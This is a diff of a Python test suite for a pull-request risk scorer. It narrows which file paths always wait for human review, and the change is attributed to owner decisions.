@@ -11,9 +11,7 @@ from __future__ import annotations
 import dataclasses
 import difflib
 import functools
-import json
 import pathlib
-import re
 import subprocess
 import sys
 import time
@@ -27,6 +25,7 @@ from babysit_risk import (
     Risk,
     RiskInput,
     Rung,
+    holds,
     normalize_path,
     score,
 )
@@ -290,74 +289,24 @@ class HighReasonTests(unittest.TestCase):
 
     def test_floor_paths_are_high(self):
         cases = [
-            (".github/workflows/ci.yml", "high-path:.github/**"),
-            (".github/trusted-actors.json", "high-path:.github/**"),
-            ("docs/conventions/pr-pipeline.yaml", "high-path:docs/conventions/**"),
-            ("AGENTS.md", "high-path:**/AGENTS.md"),
-            ("CLAUDE.md", "high-path:**/CLAUDE.md"),
-            ("plugins/foo/.claude/settings.json", "high-path:**/.claude/**"),
-            (".claude/rules/x.md", "high-path:**/.claude/**"),
-            ("scripts/sync.sh", "high-path:scripts/**"),
-            ("REVIEW.md", "high-path:REVIEW.md"),
+            (".claude/settings.json", "high-path:**/settings*.json"),
+            ("plugins/foo/settings.local.json", "high-path:**/settings*.json"),
+            (".gitmodules", "high-path:**/.gitmodules"),
+            (".github/CODEOWNERS", "high-path:**/CODEOWNERS"),
+            ("package.json", "high-path:**/package.json"),
+            ("plugins/foo/package-lock.json", "high-path:**/package-lock.json"),
+            ("plugins/foo/requirements.txt", "high-path:**/requirements*.txt"),
             (
-                "plugins/source-control/skills/babysit-prs/SKILL.md",
-                "high-path:plugins/source-control/skills/babysit-prs/**",
-            ),
-            ("plugins/review/agents/x.md", "high-path:plugins/review/**"),
-            (
-                "plugins/autonomy/reference/guardrails/work-classes.md",
-                "high-path:plugins/autonomy/reference/guardrails/**",
+                ".github/workflows/release-publish-plugins.yml",
+                "high-path:.github/workflows/release-*.yml",
             ),
             (
-                "plugins/foo/.claude-plugin/notes.md",
-                "high-path:**/.claude-plugin/**",
-            ),
-            (".claude-plugin/plugin.json", "high-path:**/.claude-plugin/**"),
-            ("lib/parse-concern-value.sh", "high-path:lib/**"),
-            (
-                "plugins/source-control/lib/yaml-subset.awk",
-                "high-path:plugins/source-control/lib/**",
+                ".github/workflows/work-resolve-issue.yml",
+                "high-path:.github/workflows/work-resolve-issue.yml",
             ),
             (
-                "plugins/source-control/skills/babysit-loop/SKILL.md",
-                "high-path:plugins/source-control/skills/babysit-loop/**",
-            ),
-            (".work-item-tracker.json", "high-path:.work-item-tracker.json"),
-        ]
-        for path, code in cases:
-            with self.subTest(path):
-                result = score(_input(files=(_file(path),)))
-                self.assertEqual(result.score, Risk.HIGH)
-                self.assertIn(code, _codes(result))
-
-    def test_plugin_and_skill_scripts_are_high(self):
-        # Skills run these through `!` lines, and agents and workflows by path.
-        cases = [
-            (
-                "plugins/bugs/scripts/concat-gotchas.sh",
-                "high-path:plugins/*/scripts/**",
-            ),
-            (
-                "plugins/foo/skills/bar/scripts/run.py",
-                "high-path:plugins/*/skills/*/scripts/**",
-            ),
-            (
-                "plugins/foo/skills/bar/reference/scripts/x.md",
-                "high-path:plugins/**/scripts/**",
-            ),
-            ("plugins/foo/docs/scripts/x.sh", "high-path:plugins/**/scripts/**"),
-            (
-                "plugins/source-control/git-hooks/pre-push",
-                "high-path:plugins/*/git-hooks/**",
-            ),
-            (
-                "plugins/harness-ops/skills/observability/otel/net-probe.sh",
-                "high-path:plugins/harness-ops/skills/observability/otel/net-probe.sh",
-            ),
-            (
-                "plugins/knowledge/skills/video-digest/extraction/preflight.mjs",
-                "high-path:plugins/knowledge/skills/video-digest/extraction/"
-                "preflight.mjs",
+                ".github/actions/check-trusted-trigger/action.yml",
+                "high-path:.github/actions/check-trusted-trigger/**",
             ),
         ]
         for path, code in cases:
@@ -371,31 +320,15 @@ class HighReasonTests(unittest.TestCase):
         result = score(_input(files=(_edit(SKILL, FRONT, after),)))
         self.assertEqual(result.score, Risk.LOW, result.reasons)
 
-    def test_near_miss_script_directories_are_not_high(self):
-        for path in (
-            "plugins/foo/reference/scripts.md",
-            "plugins/foo/skills/bar/scriptsx/run.sh",
-            "plugins/foo/docs/git-hooks.md",
-            "plugins/foo/skills/bar/git-hooks/x.md",
-            "plugins/harness-ops/skills/observability/otel/net-probe.md",
-            "plugins/knowledge/skills/video-digest/extraction/preflight.md",
-        ):
-            with self.subTest(path):
-                self.assertEqual(score(_input(files=(_file(path),))).score, Risk.LOW)
-
-    def test_agents_md_at_depth_three_is_high(self):
-        result = score(_input(files=(_file("plugins/foo/skills/AGENTS.md"),)))
-        self.assertEqual(result.score, Risk.HIGH)
-        self.assertEqual(_codes(result), ("high-path:**/AGENTS.md",))
-
     def test_case_folded_paths_are_high(self):
         cases = [
-            (".GitHub/workflows/x.yml", "high-path:.github/**"),
-            ("docs/Conventions/x.yaml", "high-path:docs/conventions/**"),
-            ("plugins/foo/Claude.md", "high-path:**/CLAUDE.md"),
-            ("Scripts/run.sh", "high-path:scripts/**"),
-            ("AGENTS.MD", "high-path:**/AGENTS.md"),
-            ("LIB/x.sh", "high-path:lib/**"),
+            (
+                ".GitHub/Workflows/PR-Merge.yml",
+                "high-path:.github/workflows/pr-merge.yml",
+            ),
+            ("plugins/foo/Codeowners", "high-path:**/CODEOWNERS"),
+            (".GITMODULES", "high-path:**/.gitmodules"),
+            ("Package.JSON", "high-path:**/package.json"),
         ]
         for path, code in cases:
             with self.subTest(path):
@@ -413,7 +346,7 @@ class HighReasonTests(unittest.TestCase):
         self.assertEqual(_codes(result), ("high-path:plugins/foo/special.md",))
 
     def test_empty_configured_set_does_not_weaken_the_floor(self):
-        result = score(_input(files=(_file(".github/x.yml"),), high_paths=()))
+        result = score(_input(files=(_file(".gitmodules"),), high_paths=()))
         self.assertEqual(result.score, Risk.HIGH)
 
     def test_near_miss_paths_are_not_high(self):
@@ -431,16 +364,18 @@ class RenameTests(unittest.TestCase):
     def test_rename_out_of_a_high_path_is_high(self):
         files = (
             _file(
-                "plugins/foo/x.yml",
+                "plugins/foo/x.json",
                 status="renamed",
-                previous_path=".github/workflows/x.yml",
+                previous_path="plugins/foo/package.json",
             ),
         )
         result = score(_input(files=files))
         self.assertEqual(result.score, Risk.HIGH)
-        self.assertEqual(_codes(result), ("high-path:.github/**", "class-contradicted"))
+        self.assertEqual(
+            _codes(result), ("high-path:**/package.json", "class-contradicted")
+        )
 
-    def test_rename_into_a_high_path_is_high(self):
+    def test_rename_into_a_workflow_takes_the_cost_hold(self):
         files = (
             _file(
                 ".github/workflows/x.yml",
@@ -453,7 +388,7 @@ class RenameTests(unittest.TestCase):
         # A file renamed into a workflow also takes the cost hold.
         self.assertEqual(
             _codes(result),
-            ("cost-review-required", "high-path:.github/**", "class-contradicted"),
+            ("cost-review-required", "class-contradicted"),
         )
 
     def test_rename_across_plugins_counts_both_plugins(self):
@@ -470,7 +405,7 @@ class OrderingTests(unittest.TestCase):
         result = score(
             _input(
                 work_class=None,
-                files=(_file(".github/x.yml", has_patch=False),),
+                files=(_file(".gitmodules", has_patch=False),),
                 files_complete=False,
             )
         )
@@ -483,8 +418,8 @@ class OrderingTests(unittest.TestCase):
             _lane("claude-security-review", open_findings=1),
         )
         files = (
-            _file("scripts/a.sh"),
-            _file(".github/b.yml", has_patch=False),
+            _file("package.json"),
+            _file(".gitmodules", has_patch=False),
             _file("plugins/foo/c.md", additions=500),
         )
         result = score(
@@ -493,15 +428,15 @@ class OrderingTests(unittest.TestCase):
         self.assertEqual(
             _codes(result),
             (
-                "high-path:.github/**",
-                "high-path:scripts/**",
+                "high-path:**/.gitmodules",
+                "high-path:**/package.json",
                 "security-finding",
                 "blast-radius-missing",
                 "class-above-rung",
                 "files-incomplete",
                 "findings:claude-review",
                 "lines-over",
-                "no-patch:.github/b.yml",
+                "no-patch:.gitmodules",
             ),
         )
 
@@ -852,9 +787,9 @@ class MalformedInputTests(unittest.TestCase):
         unsafe = [p for p in paths if not normalize_path(p)[1]]
         self.assertEqual(unsafe, [])
 
-    def test_double_star_spans_any_character(self):
-        result = score(_input(files=(_file(".github/a\nb"),)))
-        self.assertIn("high-path:.github/**", _codes(result))
+    def test_a_control_character_in_a_path_is_unsafe(self):
+        result = score(_input(files=(_file("plugins/a\nb"),)))
+        self.assertIn("high-path:**", _codes(result))
 
     def test_rename_or_copy_without_a_previous_path_is_high_at_every_class(self):
         for status in ("renamed", "copied"):
@@ -925,8 +860,8 @@ class MalformedInputTests(unittest.TestCase):
                 self.assertIn("high-path:**", _codes(result))
 
     def test_dot_slash_prefix_matches_the_floor_glob(self):
-        result = score(_input(files=(_file("./scripts/x.sh"),)))
-        self.assertIn("high-path:scripts/**", _codes(result))
+        result = score(_input(files=(_file("./.gitmodules"),)))
+        self.assertIn("high-path:**/.gitmodules", _codes(result))
 
     def test_caller_globs_are_read_exactly_as_written(self):
         # Spec: a './' or '/' prefix, a backslash, a segment ending in '.', or
@@ -953,11 +888,10 @@ class MalformedInputTests(unittest.TestCase):
     def test_floor_directory_glob_matches_the_bare_entry(self):
         # Spec: 'X/**' also matches X itself.
         for path, code in (
-            (".github", "high-path:.github/**"),
-            ("scripts", "high-path:scripts/**"),
-            ("docs/conventions", "high-path:docs/conventions/**"),
-            ("plugins/foo/.claude", "high-path:**/.claude/**"),
-            ("plugins/foo/.claude-plugin", "high-path:**/.claude-plugin/**"),
+            (
+                ".github/actions/check-trusted-trigger",
+                "high-path:.github/actions/check-trusted-trigger/**",
+            ),
         ):
             with self.subTest(path):
                 result = score(_input(files=(_file(path),)))
@@ -972,247 +906,13 @@ class MalformedInputTests(unittest.TestCase):
                 self.assertIn(f"high-path:{glob}", _codes(result))
 
 
-class TestOnlyScriptPathTests(unittest.TestCase):
-    """A change whose files under floored script paths are all tests (a
-    *.test.mjs, *.test.sh, *.test.js or test_*.py name) takes no script-path
-    hold; every other reason stays."""
-
-    SCRIPT = "high-path:plugins/*/scripts/**"
-
-    def test_test_only_change_under_a_script_directory_is_low(self):
-        files = (
-            _file("plugins/foo/scripts/tests/test_run.py"),
-            _file("plugins/foo/skills/bar/scripts/merge.test.mjs"),
-            _file("plugins/foo/skills/bar/scripts/check.test.sh"),
-            _file("plugins/foo/docs/scripts/x.test.js"),
-        )
-        result = score(_input(files=files))
-        self.assertEqual(result.score, Risk.LOW, _codes(result))
-
-    def test_a_file_only_a_tests_or_fixtures_directory_names_still_holds(self):
-        # An unchanged shipped file the scorer cannot read may source a tests/
-        # helper, glob a tests/ directory, or copy fixtures to a consumer, as a
-        # setup check copying scripts/fixtures/sources/* does.
-        for path, code in (
-            ("plugins/foo/scripts/tests/lib.sh", self.SCRIPT),
-            ("plugins/foo/scripts/tests/evil.sh", self.SCRIPT),
-            ("plugins/foo/scripts/tests/fixtures/input.json", self.SCRIPT),
-            (
-                "plugins/foo/skills/setup/scripts/fixtures/sources/x.py",
-                "high-path:plugins/*/skills/*/scripts/**",
-            ),
-        ):
-            with self.subTest(path):
-                self.assertIn(code, _codes(score(_input(files=(_file(path),)))))
-
-    def test_a_path_leaving_tests_still_holds(self):
-        path = "plugins/foo/scripts/tests/../run.sh"
-        result = score(_input(files=(_file(path),)))
-        self.assertIn(self.SCRIPT, _codes(result))
-
-    def test_a_declared_test_file_still_holds(self):
-        command = "${CLAUDE_PLUGIN_ROOT}/scripts/tests/run.test.sh"
-        hooks = json.dumps({"hooks": {"Stop": [{"hooks": [{"command": command}]}]}})
-        result = score(
-            _input(
-                files=(_file("plugins/foo/scripts/tests/run.test.sh"),),
-                declarations=(("plugins/foo/hooks/hooks.json", hooks),),
-            )
-        )
-        self.assertIn(self.SCRIPT, _codes(result))
-        self.assertIn("high-path:plugins/foo/scripts/tests", _codes(result))
-
-    def test_a_mixed_change_holds_on_its_non_test_file(self):
-        files = (
-            _file("plugins/foo/scripts/tests/test_run.py"),
-            _file("plugins/foo/scripts/run.py"),
-        )
-        reasons = {r.code: r.detail for r in score(_input(files=files)).reasons}
-        self.assertEqual(reasons.get(self.SCRIPT), "plugins/foo/scripts/run.py")
-
-    def test_a_rename_out_of_a_script_into_tests_still_holds(self):
-        moved = _file(
-            "plugins/foo/scripts/tests/run.py",
-            status="renamed",
-            previous_path="plugins/foo/scripts/run.py",
-        )
-        self.assertIn(self.SCRIPT, _codes(score(_input(files=(moved,)))))
-
-    def test_other_floor_reasons_still_hold_beside_tests(self):
-        files = (
-            _file("plugins/foo/scripts/tests/test_run.py"),
-            _file(".github/workflows/ci.yml"),
-        )
-        self.assertEqual(_codes(score(_input(files=files))), ("high-path:.github/**",))
-        babysit = "plugins/source-control/skills/babysit-prs/scripts/tests/test_x.py"
-        self.assertEqual(
-            _codes(score(_input(files=(_file(babysit),)))),
-            ("high-path:plugins/source-control/skills/babysit-prs/**",),
-        )
-
-    def test_a_denied_script_glob_still_holds_tests(self):
-        path = "plugins/foo/scripts/tests/test_run.py"
-        result = score(
-            _input(files=(_file(path),), high_paths=("plugins/*/scripts/**",))
-        )
-        self.assertIn(self.SCRIPT, _codes(result))
-
-    def test_tests_under_configured_scripts_floor_paths_are_low(self):
-        floor_paths = (
-            "plugins/discovery/skills/*/scripts/**",
-            "plugins/animation/scripts/**",  # a hook-run directory
-        )
-        for path in (
-            "plugins/discovery/skills/research/scripts/tests/test_x.py",
-            "plugins/animation/scripts/tests/test_render.py",
-            "plugins/animation/scripts/probe.test.sh",
-        ):
-            with self.subTest(path):
-                result = score(_input(files=(_file(path),), floor_paths=floor_paths))
-                self.assertEqual(result.score, Risk.LOW, _codes(result))
-
-    def test_a_non_test_file_under_a_configured_scripts_floor_path_holds(self):
-        result = score(
-            _input(
-                files=(_file("plugins/animation/scripts/render.py"),),
-                floor_paths=("plugins/animation/scripts/**",),
-            )
-        )
-        self.assertIn("high-path:plugins/animation/scripts/**", _codes(result))
-
-    def test_tests_under_a_configured_floor_path_without_scripts_hold(self):
-        result = score(
-            _input(
-                files=(_file("plugins/animation/tools/tests/test_x.py"),),
-                floor_paths=("plugins/animation/tools/**",),
-            )
-        )
-        self.assertEqual(_codes(result), ("high-path:plugins/animation/tools/**",))
-
-    def test_a_declared_test_file_under_a_configured_hook_run_directory_holds(self):
-        command = "${CLAUDE_PLUGIN_ROOT}/scripts/tests/run.test.sh"
-        hooks = json.dumps({"hooks": {"Stop": [{"hooks": [{"command": command}]}]}})
-        result = score(
-            _input(
-                files=(_file("plugins/animation/scripts/tests/run.test.sh"),),
-                floor_paths=("plugins/animation/scripts/**",),
-                declarations=(("plugins/animation/hooks/hooks.json", hooks),),
-            )
-        )
-        self.assertIn("high-path:plugins/animation/scripts/**", _codes(result))
-
-    def test_an_executable_test_only_change_like_a_monitor_poll_test_is_low(self):
-        # A lane pull request changing only this mode-100755 test file, under
-        # this repository's floor-paths and floor-script-scopes globs.
-        path = "plugins/source-control/skills/pull-request/scripts/monitor-poll.test.sh"
-        changed = _file(path, mode="100755", previous_mode="100755")
-        result = score(
-            _input(
-                files=(changed,),
-                floor_paths=("plugins/source-control/skills/*/scripts/**",),
-                floor_script_scopes=("plugins/source-control/**",),
-            )
-        )
-        self.assertEqual(result.score, Risk.LOW, _codes(result))
-        tool = _file(
-            "plugins/source-control/skills/pull-request/scripts/monitor-poll.sh",
-            mode="100755",
-            previous_mode="100755",
-        )
-        held = score(
-            _input(
-                files=(changed, tool),
-                floor_paths=("plugins/source-control/skills/*/scripts/**",),
-                floor_script_scopes=("plugins/source-control/**",),
-            )
-        )
-        self.assertIn("high-script", _codes(held))
-
-    def test_a_tests_directory_above_scripts_still_holds(self):
-        for path in (
-            "plugins/foo/skills/tests/scripts/run.sh",
-            "plugins/foo/skills/fixtures/scripts/run.py",
-            "plugins/foo/tests/scripts/run.sh",
-            "plugins/foo/skills/tests/Scripts/run.sh",
-            "plugins/foo/tests/SCRIPTS/run.py",
-        ):
-            with self.subTest(path):
-                self.assertIn(
-                    "high-path:plugins/**/scripts/**",
-                    _codes(score(_input(files=(_file(path),)))),
-                )
-        low = score(_input(files=(_file("plugins/x/scripts/tests/a.test.sh"),)))
-        self.assertEqual(low.score, Risk.LOW, _codes(low))
-
-    def test_a_tests_directory_above_a_script_scope_still_holds(self):
-        tool = _file("plugins/foo/tests/tools/run.sh", mode="100755")
-        result = score(
-            _input(files=(tool,), floor_script_scopes=("plugins/foo/tests/**",))
-        )
-        self.assertEqual(_codes(result), ("high-script",))
-        below = _file("plugins/foo/tools/tests/run.sh", mode="100755")
-        result = score(_input(files=(below,), floor_script_scopes=("plugins/foo/**",)))
-        self.assertEqual(_codes(result), ("high-script",))
-
-    def test_a_test_file_another_changed_file_names_still_holds(self):
-        test = _file("plugins/foo/skills/bar/scripts/preflight.test.sh", status="added")
-        skill = _edit(SKILL, FRONT, FRONT.replace("Body.", "Run preflight.test.sh."))
-        result = score(_input(files=(test, skill)))
-        self.assertIn("high-path:plugins/*/skills/*/scripts/**", _codes(result))
-        other = _edit(SKILL, FRONT, FRONT.replace("Body.", "Body, reworded."))
-        result = score(_input(files=(test, other)))
-        self.assertEqual(result.score, Risk.LOW, _codes(result))
-
-    def test_a_test_file_beside_an_unreadable_change_still_holds(self):
-        test = _file("plugins/foo/scripts/tests/test_run.py")
-        blob = _file("plugins/foo/assets/logo.png", has_patch=False, contents=None)
-        result = score(_input(files=(test, blob)))
-        self.assertIn(self.SCRIPT, _codes(result))
-
-    def test_a_floor_path_spelled_like_a_fixed_entry_keeps_it_holding(self):
-        result = score(
-            _input(
-                files=(_file("scripts/tests/test_x.py"),),
-                floor_paths=("scripts/**",),
-            )
-        )
-        self.assertIn("high-path:scripts/**", _codes(result))
-
-    def test_a_floor_path_glob_below_scripts_still_holds_tests(self):
-        result = score(
-            _input(
-                files=(_file("plugins/x/scripts/tests/test_a.py"),),
-                floor_paths=("plugins/x/scripts/tests/**",),
-            )
-        )
-        self.assertEqual(_codes(result), ("high-path:plugins/x/scripts/tests/**",))
-
-    def test_an_executable_test_file_in_a_script_scope_is_low(self):
-        scopes = ("plugins/foo/**",)
-        test = _file("plugins/foo/scripts/tests/run.test.sh", mode="100755")
-        result = score(_input(files=(test,), floor_script_scopes=scopes))
-        self.assertEqual(result.score, Risk.LOW, _codes(result))
-        tool = _file("plugins/foo/tools/run.sh", mode="100755")
-        result = score(_input(files=(tool,), floor_script_scopes=scopes))
-        self.assertEqual(_codes(result), ("high-script",))
-
-    def test_test_names_match_case_sensitively(self):
-        for path in (
-            "plugins/foo/scripts/Tests/run.py",
-            "plugins/foo/scripts/Test_run.py",
-            "plugins/foo/scripts/run.Test.mjs",
-        ):
-            with self.subTest(path):
-                self.assertIn(self.SCRIPT, _codes(score(_input(files=(_file(path),)))))
-
-
 class LaneSwitchTests(unittest.TestCase):
     """Owner decision Q624: in the pr-merge lane the HIGH path floor, the
     file and line caps and the C2 contradictions are each a setting the
     caller turns off. Off, the same diff that scored above LOW is LOW."""
 
     def test_the_floor_off_leaves_floor_paths_low(self):
-        files = (_file(".github/workflows/x.yml"),)
+        files = (_file(".gitmodules"),)
         self.assertEqual(score(_input(files=files)).score, Risk.HIGH)
         result = score(_input(files=files, high_floor=False))
         self.assertEqual(result.score, Risk.LOW, _codes(result))
@@ -1352,50 +1052,6 @@ class NeverRaisesTests(unittest.TestCase):
         self.assertEqual(_codes(result), ("high-path:.github/**",))
 
 
-class AddedFloorTests(unittest.TestCase):
-    def test_added_floor_paths_are_high_under_their_own_code(self):
-        for path, glob in (
-            ("plugins/guardrails/hooks/x.sh", "plugins/guardrails/**"),
-            ("plugins/work-items/skills/x.md", "plugins/work-items/**"),
-            ("plugins/foo/hooks/hooks.json", "plugins/*/hooks/**"),
-            ("prompts/x.md", "prompts/**"),
-            ("package.json", "**/package.json"),
-            ("plugins/foo/package.json", "**/package.json"),
-            ("package-lock.json", "**/package-lock.json"),
-            ("plugins/foo/package-lock.json", "**/package-lock.json"),
-            ("plugins/actionlint/lib/prerequisites.sh", "plugins/*/lib/**"),
-            (
-                "plugins/disk-hygiene/skills/clean/scripts/destructive_guard.py",
-                "plugins/disk-hygiene/skills/clean/scripts/destructive_guard.py",
-            ),
-            (
-                "plugins/disk-hygiene/skills/clean/scripts/engine_context.py",
-                "plugins/disk-hygiene/skills/clean/scripts/engine_context.py",
-            ),
-            (
-                "plugins/disk-hygiene/skills/clean/scripts/guard_launch_monitor.py",
-                "plugins/disk-hygiene/skills/clean/scripts/guard_launch_monitor.py",
-            ),
-            (".node-version", ".node-version"),
-            (".python-version", ".python-version"),
-            (".gitleaks.toml", ".gitleaks.toml"),
-            (".gitleaksignore", ".gitleaksignore"),
-            (".gitattributes", ".gitattributes"),
-            ("plugins/foo/.gitmodules", "**/.gitmodules"),
-            ("plugins/foo/CLAUDE.local.md", "**/CLAUDE.local.md"),
-            ("plugins/foo/.mcp.json", "**/.mcp.json"),
-            ("plugins/foo/AGENTS.override.md", "**/AGENTS.override.md"),
-        ):
-            with self.subTest(path):
-                result = score(_input(files=(_file(path),)))
-                self.assertEqual(result.score, Risk.HIGH)
-                self.assertIn(f"high-path:{glob}", _codes(result))
-
-    def test_root_package_lock_has_one_floor_code(self):
-        codes = _codes(score(_input(files=(_file("package-lock.json"),))))
-        self.assertEqual(codes, ("high-path:**/package-lock.json",))
-
-
 class UnreadableSetAndDetailTests(unittest.TestCase):
     def test_unreadable_configured_set_matches_only_the_floor(self):
         result = score(
@@ -1456,888 +1112,94 @@ def _lane_config():
     )
 
 
-def _lane_input(files, *, high_floor=None):
+def _lane_input(files):
     """The pr-merge lane's input under this repository's own
     docs/conventions/pr-pipeline.yaml, wired as babysit_merge.score_unattended
-    wires it; `high_floor` overrides the live `high-path-floor` when given."""
+    wires it."""
     config = _lane_config()
-    if high_floor is None:
-        high_floor = config.high_path_floor
     return _input(
         files=files,
         max_changed_lines=config.max_changed_lines,
         high_paths=config.denied_paths,
-        floor_paths=config.floor_paths,
-        floor_script_scopes=config.floor_script_scopes,
-        high_floor=high_floor,
-        floor_extensions=high_floor,
+        high_floor=config.high_path_floor,
         c2_contradictions=config.c2_contradictions,
         max_changed_files=config.max_changed_files,
         lines_optional=True,
     )
 
 
-def _local_input(files, *, high_floor):
-    """The local babysit lane's input, wired as score_unattended wires it: no
-    pr-merge switches, so main's HIGH_FLOOR always applies, and
-    `high-path-floor` gates only what this change adds. The line cap keeps
-    `_input`'s value: the config sets none, which the local lane reads as MED."""
-    config = _lane_config()
-    return _input(
-        files=files,
-        high_paths=config.denied_paths,
-        floor_paths=config.floor_paths,
-        floor_script_scopes=config.floor_script_scopes,
-        floor_extensions=high_floor,
-    )
-
-
-class LocalLaneFloorSwitchTests(unittest.TestCase):
-    """Owner decision 2026-10-18: the floor additions behave the same in every
-    lane, so with `high-path-floor` false a local-lane pull request scores as
-    on main."""
-
-    CHANGES = (
-        _file("plugins/foo/monitors/monitors.json"),
-        _file("run-me", mode="100755"),
-        _edit(SKILL, FRONT, FRONT.replace("y\n", "y\nallowed-tools: Bash\n", 1)),
-    )
-
-    def test_the_switch_governs_the_local_lane(self):
-        for changed in self.CHANGES:
-            for on, expected in ((False, Risk.LOW), (True, Risk.HIGH)):
-                with self.subTest(changed.path, high_path_floor=on):
-                    result = score(_local_input((changed,), high_floor=on))
-                    self.assertEqual(result.score, expected, _codes(result))
-
-    def test_an_unreadable_floor_paths_list_is_not_read_with_the_switch_off(self):
-        inp = _input(files=(_file("docs/x.md"),), floor_paths=("./bin/**",))
-        for high_floor in (False, True):
-            with self.subTest(high_floor=high_floor):
-                result = score(
-                    dataclasses.replace(
-                        inp, high_floor=high_floor, floor_extensions=False
-                    )
-                )
-                self.assertEqual(result.score, Risk.LOW, _codes(result))
-
-    def test_main_floor_entries_still_hold_with_the_switch_off(self):
-        result = score(_local_input((_file(".github/x.yml"),), high_floor=False))
-        self.assertIn("high-path:.github/**", _codes(result))
-
-
 class LanePathFloorTests(unittest.TestCase):
-    """Owner decision Q641: the config adds bin/, .lsp.json, settings*.json and
-    the scripts of the plugins the CI lanes load, so with the floor on a lane
-    pull request touching one waits for a human. Paths come from the decision
-    text. The floor is on (owner decision 2026-10-18, reversing Q661)."""
+    """The live pr-merge config holds only the external-effect set."""
 
     def test_the_live_config_has_the_floor_on(self):
         self.assertIs(_lane_config().high_path_floor, True)
-        result = score(_lane_input((_file("plugins/foo/bin/run"),)))
-        self.assertEqual(result.score, Risk.HIGH, _codes(result))
-        self.assertIn("high-path:**/bin/**", _codes(result))
 
-    def test_an_adr_waits_for_a_human(self):
-        # Owner decision 2026-10-21: docs/adr/** joins the floor.
-        result = score(_lane_input((_file("docs/adr/0099-x.md"),)))
-        self.assertEqual(result.score, Risk.HIGH, _codes(result))
-        self.assertIn("high-path:docs/adr/**", _codes(result))
-
-    def test_the_switch_off_gives_mains_pr_merge_scoring(self):
-        skill = FRONT.replace("y\n", "y\nallowed-tools: Bash\n", 1)
-        for changed in (
-            _file("plugins/foo/bin/run"),
-            _file(".github/x.yml"),
-            _edit(SKILL, FRONT, skill),
+    def test_the_keep_set_holds(self):
+        for path in (
+            ".claude/settings.json",
+            "plugins/foo/.claude/settings.local.json",
+            ".gitmodules",
+            ".github/CODEOWNERS",
+            "package.json",
+            "plugins/foo/package-lock.json",
+            ".github/requirements-ci.txt",
+            ".github/workflows/release-publish-plugins.yml",
+            ".github/workflows/pr-merge.yml",
+            ".github/workflows/pr-unblock.yml",
+            ".github/actions/check-trusted-trigger/action.yml",
         ):
-            with self.subTest(changed.path):
-                result = score(_lane_input((changed,), high_floor=False))
-                self.assertEqual(result.score, Risk.LOW, _codes(result))
+            with self.subTest(path):
+                result = score(_lane_input((_file(path),)))
+                self.assertEqual(result.score, Risk.HIGH, result.reasons)
 
-    LANE_PLUGINS = (
-        "ai-slop",
-        "source-control",
-        "work-items",
-        "discovery",
-        "knowledge",
-        "skill-quality",
-        "testing",
-        "review",
-        "autonomy",
-    )
-
-    def test_each_new_path_class_is_held(self):
-        paths = [
+    def test_instructions_hooks_and_scripts_merge(self):
+        # Owner direction 2026-10-22: the review lanes are the gate for these.
+        for path in (
+            "AGENTS.md",
+            "CLAUDE.md",
+            "prompts/x.md",
+            ".claude/rules/x.md",
+            "plugins/foo/hooks/hooks.json",
+            "plugins/foo/hooks/guard.sh",
             "plugins/foo/bin/tool",
-            "plugins/foo/package.json",
+            "plugins/foo/lib/x.sh",
+            "plugins/foo/scripts/run.py",
+            "plugins/foo/skills/bar/scripts/run.ps1",
             "plugins/foo/.mcp.json",
             "plugins/foo/.lsp.json",
-            "plugins/foo/settings.json",
-            ".config/settings.local.json",
-        ]
-        for plugin in self.LANE_PLUGINS:
-            paths.append(f"plugins/{plugin}/scripts/run.py")
-            paths.append(f"plugins/{plugin}/skills/some-skill/scripts/run.sh")
-        for path in paths:
-            with self.subTest(path=path):
-                result = score(_lane_input((_file(path),)))
-                self.assertEqual(result.score, Risk.HIGH, _codes(result))
-                self.assertTrue(
-                    any(
-                        r.code.startswith("high-path:")
-                        and r.code != "high-path:**"
-                        and path in r.detail
-                        for r in result.reasons
-                    ),
-                    _codes(result),
-                )
-
-    HOOK_LAUNCHED = (
-        "plugins/animation/scripts/pydeps.py",
-        "plugins/explainer-video/scripts/pydeps.py",
-        "plugins/speech/scripts/pydeps.py",
-        "plugins/playwright/skills/demo-video/scripts/pydeps.py",
-        "plugins/session-flow/skills/running-retro/scripts/arm_observer.py",
-        # A sibling module could shadow a stdlib import of the script a hook
-        # runs (review thread L451), so each directory is held whole.
-        "plugins/animation/scripts/json.py",
-        "plugins/explainer-video/scripts/re.py",
-        "plugins/speech/scripts/shlex.py",
-        "plugins/playwright/skills/demo-video/scripts/json.py",
-        "plugins/session-flow/skills/running-retro/scripts/json.py",
-        "plugins/disk-hygiene/skills/clean/scripts/json.py",
-    )
-
-    def test_scripts_a_session_start_hook_runs_are_held(self):
-        for path in self.HOOK_LAUNCHED:
-            with self.subTest(path):
-                result = score(_lane_input((_file(path),)))
-                self.assertEqual(result.score, Risk.HIGH, _codes(result))
-
-    HOOK_REF = re.compile(
-        r"\$\{?(?:CLAUDE_PLUGIN_ROOT|PLUGIN_ROOT|ROOT)\}?/"
-        r"([A-Za-z0-9_./-]+\.(?:py|sh|mjs|js|cjs|ps1))"
-    )
-
-    def test_every_script_a_plugin_hook_names_is_on_the_floor(self):
-        # Every script a hook runs by path outside hooks/ stays on the floor
-        # as hooks are added.
-        found = set()
-        for hook in sorted((REPO_ROOT / "plugins").glob("*/hooks/*")):
-            if not hook.is_file() or ".test." in hook.name:
-                continue
-            for match in self.HOOK_REF.finditer(hook.read_text(errors="ignore")):
-                rel = match.group(1)
-                path = f"plugins/{hook.parts[-3]}/{rel}"
-                if not rel.startswith("hooks/") and ".." not in rel:
-                    if (REPO_ROOT / path).is_file():
-                        found.add(path)
-                        # A sibling module shadowing one of its imports.
-                        found.add(path.rsplit("/", 1)[0] + "/json.py")
-        self.assertTrue(found)
-        for path in sorted(found):
-            with self.subTest(path):
-                result = score(_lane_input((_file(path),)))
-                self.assertEqual(result.score, Risk.HIGH, _codes(result))
-
-    def test_script_types_in_lane_plugins_and_the_top_level_are_held(self):
-        # Owner decision Q646: .ps1, .cjs and mode 100755 files.
-        held = (
-            _file("plugins/testing/reference/run.ps1"),
-            _file("plugins/knowledge/vendor/x/digest.cjs"),
-            _file("plugins/autonomy/reference/tool", mode="100755"),
-            _file("install.ps1"),
-            _file("tool.cjs"),
-            _file("run-me", mode="100755"),
-        )
-        for changed in held:
-            with self.subTest(changed.path):
-                result = score(_lane_input((changed,)))
-                self.assertEqual(result.score, Risk.HIGH, _codes(result))
-                self.assertIn("high-script", _codes(result))
-
-    def test_script_types_in_other_plugins_stay_low(self):
-        # Q640c: outside the lane plugins they are an accepted risk.
-        for changed in (
-            _file("plugins/foo/reference/run.ps1"),
-            _file("plugins/foo/reference/x.cjs"),
